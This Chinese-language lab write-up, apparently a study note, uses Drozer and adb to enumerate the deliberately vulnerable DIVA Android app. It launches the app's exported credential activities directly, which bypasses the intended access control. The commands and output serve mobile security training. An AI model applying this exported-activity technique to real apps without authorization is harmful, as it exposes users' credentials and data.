---
title: Test DIVA - activity exported
tags: [Android, Drozer]

category: "Tools｜Others｜Android Related｜Drozer｜Test DIVA"
---

* DIVA - [Download](https://payatu.com/wp-content/uploads/2016/01/diva-beta.tar.gz)

# Test DIVA - activity exported
<!-- more -->
參考[^csdn-diva-1][^安全客-diva-1][^安全客-diva-2][^hacktricks-diva-sieve]
1. 起手式 - 確認App資訊
    ```bash
    dz> run app.package.list -f diva
    Attempting to run shell module
    jakhar.aseem.diva (Diva)
    
    dz> run app.package.info -a jakhar.aseem.diva
    Attempting to run shell module
    Package: jakhar.aseem.diva
      Application Label: Diva
      Process Name: jakhar.aseem.diva
      Version: 1.0
      Data Directory: /data/user/0/jakhar.aseem.diva
      APK Path: /data/app/~~ieYmYeSxvDRbS7R8da3n_g==/jakhar.aseem.diva--xnWMS5i2UVEuuoE1JHskg==/base.apk
      UID: 10282
      GID: [3003]
      Shared Libraries: [/system/framework/android.test.base.jar, /system/framework/org.apache.http.legacy.jar]
      Shared User ID: null
      Uses Permissions:
      - android.permission.WRITE_EXTERNAL_STORAGE
      - android.permission.READ_EXTERNAL_STORAGE
      - android.permission.INTERNET
      - android.permission.POST_NOTIFICATIONS
      - android.permission.ACCESS_MEDIA_LOCATION
      - android.permission.READ_MEDIA_AUDIO
      - android.permission.READ_MEDIA_VIDEO
      - android.permission.READ_MEDIA_IMAGES
      Defines Permissions:
      - None

    dz> run app.package.attacksurface jakhar.aseem.diva
    Attempting to run shell module
    Attack Surface:
      3 activities exported
      0 broadcast receivers exported
      1 content providers exported
      0 services exported
        is debuggable
    ```
    package name: jakhar.aseem.diva
    attack surface: activities exported/content providers exported/is debuggable
2. 確認activiy的資訊
    ```bash
    dz> run app.activity.info -a jakhar.aseem.diva
    Attempting to run shell module
    Package: jakhar.aseem.diva
      jakhar.aseem.diva.MainActivity
        Permission: null
      jakhar.aseem.diva.APICredsActivity
        Permission: null
      jakhar.aseem.diva.APICreds2Activity
        Permission: null
    ```
    目前有兩個被export的activity，分別啟動後如下
    ```bash
    dz> run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICredsActivity
    ```
    ![Screenshot_20240604-155745](https://hackmd.io/_uploads/By3VCB340.png =200x)

    ```bash
    dz> run app.activity.start --component jakhar.aseem.diva jakhar.aseem.diva.APICreds2Activity
    ```
    ![Screenshot_20240604-161940](https://hackmd.io/_uploads/ryTHAS3EA.png =200x)
    按照[^安全客-diva-2]的說明，這是==9.Access Control Issue - Part 1==題目的畫面，原本的設想是不要按`VIEW API CREDENTIALS`這個按鈕也可以取得上面的機敏資料
    
## 另外一種解法
按照[^安全客-diva-2]作者用另外一種方式去load這個activity，先看AndroidManifest.xml，當中有特別寫到這個activity是用intent-filter當作這個activity的類似保護的東西
```xml
<activity android:label="@string/apic_label" android:name="jakhar.aseem.diva.APICredsActivity">
    <intent-filter>
        <action android:name="jakhar.aseem.diva.action.VIEW_CREDS"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
<activity android:label="@string/apic2_label" android:name="jakhar.aseem.diva.APICreds2Activity">
    <intent-filter>
        <action android:name="jakhar.aseem.diva.action.VIEW_CREDS2"/>
        <category android:name="android.intent.category.DEFAULT"/>
    </intent-filter>
</activity>
```
會發現前面找到的兩個activity都出現在這邊，那是否我可以直接用adb，啟動這個activity，並且給予他指定的intent，答案是肯定的
```bash
$ adb shell am start -n jakhar.aseem.diva/.APICredsActivity -a jakhar.aseem.diva.action.VIEW_CREDS
Starting: Intent { act=jakhar.aseem.diva.action.VIEW_CREDS cmp=jakhar.aseem.diva/.APICredsActivity }
$ adb shell am start -n jakhar.aseem.diva/.APICreds2Activity -a jakhar.aseem.diva.action.VIEW_CREDS2
Starting: Intent { act=jakhar.aseem.diva.action.VIEW_CREDS2 cmp=jakhar.aseem.diva/.APICreds2Activity }
```
`am start`: 啟動一個activity
`-n <package name + /. + activity class name>`: 指定哪一個activity
`-a <specified intent>`: 指定的 action，用於告訴應用程式以特定方式處理這個啟動動作

按照上面的指示，就會出現剛剛一樣的畫面了
# Reference
[^csdn-diva-1]:[DIVA靶場測試APP客戶端不規範項（一）](https://blog.csdn.net/weixin_44309905/article/details/123764180)
[^hacktricks-diva-sieve]:[Drozer Tutorial](https://book.hacktricks.xyz/v/cn/mobile-pentesting/android-app-pentesting/drozer-tutorial)
[^安全客-diva-1]:[【技術分享】Android App常見安全問題演練分析系統-DIVA-Part1](https://www.anquanke.com/post/id/84603)
[^安全客-diva-2]:[【技術分享】Android App常見安全問題演練分析系統-DIVA-Part2](https://www.anquanke.com/post/id/86057)